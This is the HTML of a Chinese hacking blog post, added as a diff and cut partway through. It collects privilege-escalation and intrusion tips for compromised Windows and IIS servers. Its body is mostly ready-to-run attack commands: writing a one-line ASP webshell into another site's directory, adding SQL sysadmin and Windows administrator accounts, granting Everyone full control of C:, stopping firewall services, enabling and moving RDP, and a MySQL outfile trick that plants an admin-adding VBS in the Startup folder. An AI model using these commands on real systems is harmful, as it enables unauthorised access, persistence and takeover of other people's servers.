@@ -1,0 +1,1961 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>【渗透】各种提权 渗透 经验 技巧总结大全 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，WordPress 平台爆绝对路径的方法，phpMyAdmin 爆路径办法，虚拟主机网站可能目录，CMD 下操作 VPN 相关知识、资料，Cmd、Dos 命令行下添加 SQL 用户的方法，Cmd 访问控制权限控制，关闭常见杀软，安装5次shift后门，沾滞键后门，替换SHIFT后门，添加隐藏系统账号，安装 MSSQL 扩展后门，处理服务器MSFTP日志，MSSQL查询分析器连接记录清除，防BT系统拦截技巧，使用远程下载shell，VNC、Radmin、PcAnywhere 的提权方法，搜狗输入法 PinyinUp.exe 提权，WinWebMail 提权加用户，1433 SA权限构建注入点，liunx 相关提权渗透技巧总结，ldap 渗透技巧，NFS 渗透技巧，rsync渗透技巧，squid渗透技巧，SSH端口转发，joomla渗透小技巧，Linux添加UID为0的root用户，freebsd本地提权，tar 文件夹打包，收集系统信息的脚本，ethash 不免杀怎么获取本机 hash，vbs 下载者，create table a (cmd text)，Cmd 下目录的操作技巧，Linux 系统下的一些常见路径，Windows 系统下的一些常见路径，星外虚拟主机，华众虚拟主机，各种网站的配置文件相对路径大全，去除TCP IP筛选，Webshell 提权小技巧，命令行调用 RAR 打包。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="各种提权、渗透经验、技巧总结大全,提权、渗透经验、技巧,提权经验,提权技巧,渗透经验,渗透技巧,总结大全,旁站路径问题,iis_spy 列举,WordPress 平台爆绝对路径的方法,phpMyAdmin 爆路径办法,虚拟主机网站可能目录,CMD 下操作 VPN 相关知识、资料,Cmd、Dos 命令行下添加 SQL 用户的方法,Cmd 访问控制权限控制,关闭常见杀软,安装5次shift后门,沾滞键后门,替换SHIFT后门,添加隐藏系统账号,安装 MSSQL 扩展后门,处理服务器MSFTP日志,MSSQL查询分析器连接记录清除,防BT系统拦截技巧,使用远程下载shell,VNC、Radmin、PcAnywhere 的提权方法,搜狗输入法 PinyinUp.exe 提权,WinWebMail 提权加用户,1433 SA权限构建注入点,liunx 相关提权渗透技巧总结,ldap 渗透技巧,NFS 渗透技巧,rsync渗透技巧,squid渗透技巧,SSH端口转发,joomla渗透小技巧,Linux添加UID为0的root用户,freebsd本地提权,tar 文件夹打包,收集系统信息的脚本,ethash 不免杀怎么获取本机 hash,vbs 下载者,create table a (cmd text),Cmd 下目录的操作技巧,Linux 系统下的一些常见路径,Windows 系统下的一些常见路径,星外虚拟主机,华众虚拟主机,各种网站的配置文件相对路径大全,去除TCP IP筛选,Webshell 提权小技巧,命令行调用 RAR 打包,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/1018/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="【渗透】各种提权 渗透 经验 技巧总结大全" />
+<meta property="og:description" content="各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，WordPress 平台爆绝对路径的方法，phpMyAdmin 爆路径办法，虚拟主机网站可能目录，CMD 下操作 VPN 相关知识、资料，Cmd、Dos 命令行下添加 SQL 用户的方法，Cmd 访问控制权限控制，关闭常见杀软，安装5次shift后门，沾滞键后门，替换SHIFT后门，添加隐藏系统账号，安装 MSSQL 扩展后门，处理服务器MSFTP日志，MSSQL查询分析器连接记录清除，防BT系统拦截技巧，使用远程下载shell，VNC、Radmin、PcAnywhere 的提权方法，搜狗输入法 PinyinUp.exe 提权，WinWebMail 提权加用户，1433 SA权限构建注入点，liunx 相关提权渗透技巧总结，ldap 渗透技巧，NFS 渗透技巧，rsync渗透技巧，squid渗透技巧，SSH端口转发，joomla渗透小技巧，Linux添加UID为0的root用户，freebsd本地提权，tar 文件夹打包，收集系统信息的脚本，ethash 不免杀怎么获取本机 hash，vbs 下载者，create table a (cmd text)，Cmd 下目录的操作技巧，Linux 系统下的一些常见路径，Windows 系统下的一些常见路径，星外虚拟主机，华众虚拟主机，各种网站的配置文件相对路径大全，去除TCP IP筛选，Webshell 提权小技巧，命令行调用 RAR 打包。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/1018/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2010-12-11T17:54:00&#43;08:00" />
+<meta property="article:modified_time" content="2010-12-11T17:54:00&#43;08:00" />
+
+<meta itemprop="name" content="【渗透】各种提权 渗透 经验 技巧总结大全">
+<meta itemprop="description" content="各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，WordPress 平台爆绝对路径的方法，phpMyAdmin 爆路径办法，虚拟主机网站可能目录，CMD 下操作 VPN 相关知识、资料，Cmd、Dos 命令行下添加 SQL 用户的方法，Cmd 访问控制权限控制，关闭常见杀软，安装5次shift后门，沾滞键后门，替换SHIFT后门，添加隐藏系统账号，安装 MSSQL 扩展后门，处理服务器MSFTP日志，MSSQL查询分析器连接记录清除，防BT系统拦截技巧，使用远程下载shell，VNC、Radmin、PcAnywhere 的提权方法，搜狗输入法 PinyinUp.exe 提权，WinWebMail 提权加用户，1433 SA权限构建注入点，liunx 相关提权渗透技巧总结，ldap 渗透技巧，NFS 渗透技巧，rsync渗透技巧，squid渗透技巧，SSH端口转发，joomla渗透小技巧，Linux添加UID为0的root用户，freebsd本地提权，tar 文件夹打包，收集系统信息的脚本，ethash 不免杀怎么获取本机 hash，vbs 下载者，create table a (cmd text)，Cmd 下目录的操作技巧，Linux 系统下的一些常见路径，Windows 系统下的一些常见路径，星外虚拟主机，华众虚拟主机，各种网站的配置文件相对路径大全，去除TCP IP筛选，Webshell 提权小技巧，命令行调用 RAR 打包。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2010-12-11T17:54:00&#43;08:00" />
+<meta itemprop="dateModified" content="2010-12-11T17:54:00&#43;08:00" />
+<meta itemprop="wordCount" content="7351">
+<meta itemprop="keywords" content="技巧,渗透,提权,360,Anonymous,app,ASP,CGI,Cmd,CMS,Dos,exe,EXP,FLASH,FTP,Hack,Hash,Html,HTTP,IE,IIS,IP,IPS,js,Linux,MAC,MD5,Microsoft,mssql,Mysql,NDS,Net,PHP,POS,QQ,Rat,Root,Shell,SQL,SSH,SSL,T00ls,Unix,URL,VB,VBS,VPN,Web,WebShell,Windows,安全,爆,本地,病毒,查询,查找,程序,端口,服务,服务器,工具,狗,管理,后门,脚本,密码,免杀,命令,权限,数据,数据库,网站,文件,文件夹,问题,系统,隐藏,远程,注册表," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="【渗透】各种提权 渗透 经验 技巧总结大全"/>
+<meta name="twitter:description" content="各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，WordPress 平台爆绝对路径的方法，phpMyAdmin 爆路径办法，虚拟主机网站可能目录，CMD 下操作 VPN 相关知识、资料，Cmd、Dos 命令行下添加 SQL 用户的方法，Cmd 访问控制权限控制，关闭常见杀软，安装5次shift后门，沾滞键后门，替换SHIFT后门，添加隐藏系统账号，安装 MSSQL 扩展后门，处理服务器MSFTP日志，MSSQL查询分析器连接记录清除，防BT系统拦截技巧，使用远程下载shell，VNC、Radmin、PcAnywhere 的提权方法，搜狗输入法 PinyinUp.exe 提权，WinWebMail 提权加用户，1433 SA权限构建注入点，liunx 相关提权渗透技巧总结，ldap 渗透技巧，NFS 渗透技巧，rsync渗透技巧，squid渗透技巧，SSH端口转发，joomla渗透小技巧，Linux添加UID为0的root用户，freebsd本地提权，tar 文件夹打包，收集系统信息的脚本，ethash 不免杀怎么获取本机 hash，vbs 下载者，create table a (cmd text)，Cmd 下目录的操作技巧，Linux 系统下的一些常见路径，Windows 系统下的一些常见路径，星外虚拟主机，华众虚拟主机，各种网站的配置文件相对路径大全，去除TCP IP筛选，Webshell 提权小技巧，命令行调用 RAR 打包。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">【渗透】各种提权 渗透 经验 技巧总结大全</h1>
+      
+      <div class="post-meta">
+        <time datetime="2010-12-11" class="post-time">
+          2010-12-11
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E6%8A%80%E5%B7%A7/"> 技巧 </a>
+            <a href="https://lcx.cc/categories/%E6%B8%97%E9%80%8F/"> 渗透 </a>
+            <a href="https://lcx.cc/categories/%E6%8F%90%E6%9D%83/"> 提权 </a>
+            
+          </div>
+        <span class="more-meta"> 约 7351 字 </span>
+          <span class="more-meta"> 预计阅读 15 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<DIV style="DISPLAY: none">各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，WordPress 平台爆绝对路径的方法，phpMyAdmin 爆路径办法，虚拟主机网站可能目录，CMD 下操作 VPN 相关知识、资料，Cmd、Dos 命令行下添加 SQL 用户的方法，Cmd 访问控制权限控制，关闭常见杀软，安装5次shift后门，沾滞键后门，替换SHIFT后门，添加隐藏系统账号，安装 MSSQL 扩展后门，处理服务器MSFTP日志，MSSQL查询分析器连接记录清除，防BT系统拦截技巧，使用远程下载shell，VNC、Radmin、PcAnywhere 的提权方法，搜狗输入法 PinyinUp.exe 提权，WinWebMail 提权加用户，1433 SA权限构建注入点，liunx 相关提权渗透技巧总结，ldap 渗透技巧，NFS 渗透技巧，rsync渗透技巧，squid渗透技巧，SSH端口转发，joomla渗透小技巧，Linux添加UID为0的root用户，freebsd本地提权，tar 文件夹打包，收集系统信息的脚本，ethash 不免杀怎么获取本机 hash，vbs 下载者，create table a (cmd text)，Cmd 下目录的操作技巧，Linux 系统下的一些常见路径，Windows 系统下的一些常见路径，星外虚拟主机，华众虚拟主机，各种网站的配置文件相对路径大全，去除TCP IP筛选，Webshell 提权小技巧，命令行调用 RAR 打包</DIV>
+<P>&nbsp;&nbsp;&nbsp; 本文原件由0x童鞋收集整理，感谢0x童鞋，本人补充和优化了点，本文毫无逻辑可言，因为是想到什么就写了，大家见谅。</P>
+<P>&nbsp;&nbsp;&nbsp; 本着共享之精神，方便各位黑阔、童鞋，发表此文，希望抛砖引玉，童鞋们踊跃发言。使之更加完善，在交流中进步，形成良好的互动~~</P>
+<P>&nbsp;&nbsp;&nbsp; 感谢T00LS的童鞋们踊跃交流，让我学到许多经验，为了方便其他童鞋浏览，将T00LS的童鞋们补充的贴在下面，同时我也会以后将自己的一些想法跟新在后面。</P>
+<P>&nbsp;&nbsp;&nbsp; 大部分内容转至t00ls原帖，自己又加了一部分，修正了下板式，原帖太乱了！部分技巧虽然简单，但是异常实用，高手请勿喷，菜鸟请虚心学习。</P>
+<P>&nbsp;&nbsp;&nbsp; 这些技巧在不断地完善更新中，本文章最后更新于：<STRONG>2010-12-11 18:56:14</STRONG>。</P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">旁站路径问题：</FONT> <br />
+</P>
+<P>&nbsp;&nbsp;&nbsp; 1、读网站配置。</P>
+<P>&nbsp;&nbsp;&nbsp; 2、用以下VBS：</P>
+<P align=center>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P>On Error Resume Next <br />
+If (LCase(Right(WScript.Fullname, 11)) = "wscript.exe") Then <br />
+&nbsp;&nbsp;&nbsp; MsgBox Space(12) &amp; "IIS Virtual Web Viewer" &amp; Space(12) &amp; Chr(13) &amp; Space(9) &amp; " Usage:Cscript vWeb.vbs", 4096, "Lilo" <br />
+&nbsp;&nbsp;&nbsp; WScript.Quit <br />
+End If <br />
+Set objservice = GetObject("IIS://LocalHost/W3SVC") <br />
+For Each obj3w In objservice <br />
+&nbsp;&nbsp;&nbsp; If IsNumeric(obj3w.Name) Then <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Set OService = GetObject("IIS://LocalHost/W3SVC/" &amp; obj3w.Name) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Set VDirObj = OService.GetObject("IIsWebVirtualDir", "ROOT") <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Err &lt;&gt; 0 Then WScript.Quit (1) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WScript.Echo Chr(10) &amp; "[" &amp; OService.ServerComment &amp; "]" <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For Each Binds In OService.ServerBindings <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web = "{ " &amp; Replace(Binds, ":", " } { ") &amp; " }" <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WScript.Echo Replace(Split(Replace(Web, " ", ""), "}{")(2), "}", "") <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Next <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WScript.Echo "Path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : " &amp; VDirObj.Path <br />
+&nbsp;&nbsp;&nbsp; End If <br />
+Next</P></TD></TR></TBODY></TABLE></P>
+<P>&nbsp;&nbsp;&nbsp; 3、iis_spy 列举（注：需要支持ASPX，反IISSPY的方法：将 activeds.dll，activeds.tlb 降权）。</P>
+<P>&nbsp;&nbsp;&nbsp; 4、得到目标站目录，不能直接跨的。可以通过“<FONT color=#0000ff>echo&nbsp; ^&lt;%execute(request("cmd"))%^&gt; &gt;&gt;X:\目标目录\X.asp</FONT>”或者“<FONT color=#0000ff>copy 脚本文件 X:\目标目录\X.asp</FONT>”像目标目录写入webshell，或者还可以试试type命令。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">WordPress 的平台，爆绝对路径的方法是：</FONT></P>
+<P>url/wp-content/plugins/akismet/akismet.php <br />
+url/wp-content/plugins/akismet/hello.php</P></TD></TR></TBODY></TABLE></P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">phpMyAdmin 爆路径办法：</FONT></P>
+<P>phpMyAdmin/libraries/select_lang.lib.php <br />
+phpMyAdmin/darkblue_orange/layout.inc.php <br />
+phpMyAdmin/index.php?lang[]=1 <br />
+phpmyadmin/themes/darkblue_orange/layout.inc.php</P></TD></TR></TBODY></TABLE>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">网站可能目录（注：一般是虚拟主机类）：</FONT></P>
+<P>data/htdocs.网站/网站/</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">CMD 下操作 VPN 相关知识、资料：</FONT></P>
+<P>#允许administrator拨入该VPN： <br />
+netsh ras set user administrator permit</P>
+<P>#禁止administrator拨入该VPN： <br />
+netsh ras set user administrator deny</P>
+<P>#查看哪些用户可以拨入VPN： <br />
+netsh ras show user</P>
+<P>#查看VPN分配IP的方式： <br />
+netsh ras ip show config</P>
+<P>#使用地址池的方式分配IP： <br />
+netsh ras ip set addrassign method = pool</P>
+<P>#地址池的范围是从192.168.3.1到192.168.3.254： <br />
+netsh ras ip add range from = 192.168.3.1 to = 192.168.3.254</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Cmd、Dos 命令行下添加 SQL 用户的方法：</FONT></P>
+<P>需要有管理员权限，在命令下先建立一个“c:\test.qry”文件，内容如下：</P>
+<P>exec master.dbo.sp_addlogin test,123 <br />
+EXEC sp_addsrvrolemember 'test, 'sysadmin'</P>
+<P>然后在DOS下执行：cmd.exe /c isql -E /U alma /P /i c:\test.qry</P>
+<P>另类的加用户方法：</P>
+<P>在删掉了 net.exe 和不用 adsi 之外，新的加用户的方法。代码如下：</P>
+<P>js: <br />
+var o=new ActiveXObject( "Shell.Users" ); <br />
+z=o.create("test") ; <br />
+z.changePassword("123456","") <br />
+z.setting("AccountType")=3;</P>
+<P>vbs: <br />
+Set&nbsp;o=CreateObject( "Shell.Users" ) <br />
+Set z=o.create("test") <br />
+z.changePassword "123456","" <br />
+z.setting("AccountType")=3</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Cmd 访问控制权限控制：</FONT></P>
+<P>命令如下：</P>
+<P>cacls c: /e /t /g everyone:F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #c盘everyone权限 <br />
+cacls "目录" /d everyone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #everyone不可读，包括admin</P>
+<P>备注：</P>
+<P>&nbsp;&nbsp;&nbsp; 反制方法，在文件夹安全设置里将 Everyone 设定为不可读，如果没有安全性选项：工具 - 文件夹选项 - 使用简单的共享去掉即可。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">3389 相关，以下配合PR更好：</FONT></P>
+<P>a、防火墙TCP/IP筛选.（关闭：net stop policyagent &amp; net stop sharedaccess） <br />
+b、内网环境（lcx.exe） <br />
+c、终端服务器超出了最大允许连接（XP 运行：mstsc /admin；2003 运行：mstsc /console）</P>
+<P>1.查询终端端口：</P>
+<P>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber</P>
+<P>2.开启XP&amp;2003终端服务：</P>
+<P>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</P>
+<P>3.更改终端端口为2008(十六进制为：0x7d8)：</P>
+<P>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f</P>
+<P>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f</P>
+<P>4.取消xp&amp;2003系统防火墙对终端服务的限制及IP连接的限制：</P>
+<P>REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@&nbsp; xpsp2res.dll,-22009 /f</P>
+<P>create table a (cmd text); <br />
+insert into a values ("set wshshell=createobject (""wscript.shell"")"); <br />
+insert into a values ("a=wshshell.run (""cmd.exe /c net user admin admin /add"",0)"); <br />
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators admin /add"",0)");&nbsp;  <br />
+select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";</P>
+<P>BS马的PortMap功能，类似LCX做转发。若果支持ASPX，用这个转发会隐蔽点。（注：一直忽略了在偏僻角落的那个功能）</P></TD></TR></TBODY></TABLE></P>
+<P>
